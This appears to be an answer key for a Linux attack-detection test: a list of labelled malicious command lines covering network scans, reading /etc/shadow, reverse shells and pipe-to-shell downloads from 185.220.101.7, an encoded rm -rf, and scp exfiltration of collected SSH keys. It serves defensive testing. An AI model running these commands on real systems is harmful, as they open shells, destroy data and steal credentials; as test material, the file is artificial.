# Ground truth for attack_linux — one malicious command_line per line.
# Whitespace-normalized matching; blanks and #-comments ignored.
# Recon
nmap -sn 10.0.0.0/24
nmap -p- -T4 10.0.0.5
cat /etc/shadow
grep -r password /home
find / -perm -4000 -type f 2>/dev/null
# Staging / cred access
tar czf /tmp/loot.tgz /home/deploy/.ssh /etc/passwd
chmod +x /tmp/.implant
# Delivery / C2
curl -fsSL http://185.220.101.7/stage2.sh | sh
bash -i >& /dev/tcp/185.220.101.7/4444 0>&1
nc -e /bin/sh 185.220.101.7 9001
python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('185.220.101.7',4444))"
wget -qO- http://185.220.101.7/p.sh | bash
echo c3VkbyBybSAtcmYK | base64 -d | bash
# Exfil
scp /tmp/loot.tgz attacker@185.220.101.7:/exfil/
